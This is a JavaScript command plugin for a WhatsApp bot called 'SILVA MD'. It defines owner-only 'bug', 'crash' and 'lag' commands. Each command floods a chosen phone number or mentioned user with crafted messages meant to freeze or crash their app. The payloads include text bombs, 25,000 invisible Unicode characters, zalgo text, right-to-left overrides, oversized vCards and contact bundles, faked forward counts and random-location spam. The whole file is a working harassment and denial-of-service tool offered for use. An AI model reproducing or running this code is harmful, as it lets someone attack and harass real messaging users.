const config = require('../config')

const handler = {
    help: ['bug @user <type>', 'crash @user <type>', 'lag @user <type>'],
    tags: ['fun', 'owner'],
    command: /^(bug|crash|lag)$/i,
    group: false,
    admin: false,
    botAdmin: false,
    owner: true,

    execute: async ({ jid, sock, message, args, text }) => {
        try {
            const sender = message.key.participant || message.key.remoteJid

            const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || []
            const numArg = args[0]?.replace(/[^0-9]/g, '')
            const bugType = args[1]?.toLowerCase() || args[0]?.toLowerCase() || '1'

            let targetJid = null
            if (mentions.length > 0) {
                targetJid = mentions[0]
            } else if (numArg && numArg.length >= 7) {
                targetJid = numArg + '@s.whatsapp.net'
            }

            if (!targetJid) {
                return sock.sendMessage(jid, {
                    text: `╭━━━━━━━━━━━━━━━━━━━━╮
┃   🐛 BUG SENDER     ┃
╰━━━━━━━━━━━━━━━━━━━━╯

*Usage:*
${config.PREFIX}bug @user <type>
${config.PREFIX}bug <number> <type>

*Bug Types:*
1 - Text bomb (heavy text)
2 - Emoji flood
3 - Blank bomb
4 - Zalgo text
5 - Reverse text bomb
6 - vCard bomb
7 - Long contact name
8 - Repeated forward
9 - Location spam
10 - Giant text wall

_Owner only command._`
                }, { quoted: message })
            }

            await sock.sendMessage(jid, { react: { text: '🐛', key: message.key } })

            const bugMessages = generateBug(bugType, sock)

            let sent = 0
            for (const bugMsg of bugMessages) {
                try {
                    await sock.sendMessage(targetJid, bugMsg)
                    sent++
                    await new Promise(r => setTimeout(r, 200))
                } catch (e) {}
            }

            await sock.sendMessage(jid, { react: { text: '✅', key: message.key } })

            await sock.sendMessage(jid, {
                text: `🐛 *Bug sent to @${targetJid.split('@')[0]}*\nType: ${bugType}\nMessages: ${sent}/${bugMessages.length}`,
                mentions: [targetJid]
            }, { quoted: message })

        } catch (err) {
            await sock.sendMessage(jid, {
                text: `❌ Error: ${err.message}`
            }, { quoted: message })
        }
    }
}

function generateBug(type, sock) {
    const bugs = []

    switch (type) {
        case '1':
        case 'text': {
            const heavy = '꧁ঔৣ☬✞ SILVA MD ✞☬ঔৣ꧂'.repeat(200)
            for (let i = 0; i < 5; i++) bugs.push({ text: heavy })
            break
        }
        case '2':
        case 'emoji': {
            const emojis = '💀☠️👻😈🔥⚡🌪️💣🧨🎆🎇✨💫⭐🌟💥💢💦💨🕳️💤💮🏵️🌸💠🎭🃏🀄🎴🎪🎫🎟️🎪'.repeat(80)
            for (let i = 0; i < 5; i++) bugs.push({ text: emojis })
            break
        }
        case '3':
        case 'blank': {
            const blank = '\u200e'.repeat(10000) + '\u2800'.repeat(10000) + '\u200b'.repeat(5000)
            for (let i = 0; i < 5; i++) bugs.push({ text: blank })
            break
        }
        case '4':
        case 'zalgo': {
            let zalgo = ''
            const base = 'SILVA MD BOT BUG ACTIVATED '
            for (const char of base.repeat(50)) {
                zalgo += char
                for (let i = 0; i < 20; i++) {
                    zalgo += String.fromCharCode(0x0300 + Math.floor(Math.random() * 112))
                }
            }
            for (let i = 0; i < 3; i++) bugs.push({ text: zalgo })
            break
        }
        case '5':
        case 'reverse': {
            const rtl = '\u202e'
            const text = rtl + 'SILVA MD BOT '.repeat(500)
            for (let i = 0; i < 3; i++) bugs.push({ text: text })
            break
        }
        case '6':
        case 'vcard': {
            const vcardName = 'S'.repeat(500)
            const vcard = `BEGIN:VCARD\nVERSION:3.0\nN:;${vcardName};;;\nFN:${vcardName}\nTEL;type=CELL;type=VOICE;waid=0:+0\nEND:VCARD`
            for (let i = 0; i < 10; i++) {
                bugs.push({
                    contacts: {
                        displayName: vcardName,
                        contacts: [{ vcard }]
                    }
                })
            }
            break
        }
        case '7':
        case 'contact': {
            const contacts = []
            for (let i = 0; i < 100; i++) {
                const name = 'BUG' + String.fromCharCode(0x0300 + (i % 112)).repeat(20) + i
                contacts.push({
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${name};;;\nFN:${name}\nTEL;type=CELL:+${Math.floor(Math.random() * 9999999999)}\nEND:VCARD`
                })
            }
            bugs.push({
                contacts: {
                    displayName: 'SILVA BUG',
                    contacts: contacts
                }
            })
            for (let i = 0; i < 3; i++) {
                bugs.push({
                    contacts: {
                        displayName: 'SILVA BUG',
                        contacts: contacts
                    }
                })
            }
            break
        }
        case '8':
        case 'forward': {
            const fwdText = '⚠️'.repeat(1000)
            for (let i = 0; i < 10; i++) {
                bugs.push({
                    text: fwdText,
                    contextInfo: {
                        forwardingScore: 999999,
                        isForwarded: true
                    }
                })
            }
            break
        }
        case '9':
        case 'location': {
            for (let i = 0; i < 15; i++) {
                bugs.push({
                    location: {
                        degreesLatitude: Math.random() * 180 - 90,
                        degreesLongitude: Math.random() * 360 - 180,
                        name: '🐛'.repeat(100),
                        address: 'BUG'.repeat(200)
                    }
                })
            }
            break
        }
        case '10':
        case 'wall': {
            let wall = ''
            const chars = '█▓▒░▄▀■□▪▫●○◆◇★☆▲△▼▽◄►'
            for (let i = 0; i < 20000; i++) {
                wall += chars[Math.floor(Math.random() * chars.length)]
            }
            for (let i = 0; i < 3; i++) bugs.push({ text: wall })
            break
        }
        default: {
            const heavy = '꧁ঔৣ☬✞ SILVA MD ✞☬ঔৣ꧂'.repeat(200)
            for (let i = 0; i < 5; i++) bugs.push({ text: heavy })
            break
        }
    }

    return bugs
}

module.exports = { handler }
